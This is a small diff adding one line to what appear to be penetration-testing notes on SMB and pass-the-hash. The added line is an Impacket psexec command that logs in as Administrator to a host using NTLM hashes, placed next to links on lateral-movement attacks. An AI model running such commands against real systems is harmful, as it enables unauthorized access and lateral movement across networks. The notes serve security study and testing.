@@ -53,6 +53,7 @@ Essentially, sometimes you just need a set of creds to launch this attack - see 
 
 ## Resource on SMB and PTH
 ```
+See Impacket Section: ./psexec.py Administrator@192.168.10.17 -hashes "HASH:HASH"
 [URL] https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
 [URL] https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/
 ```
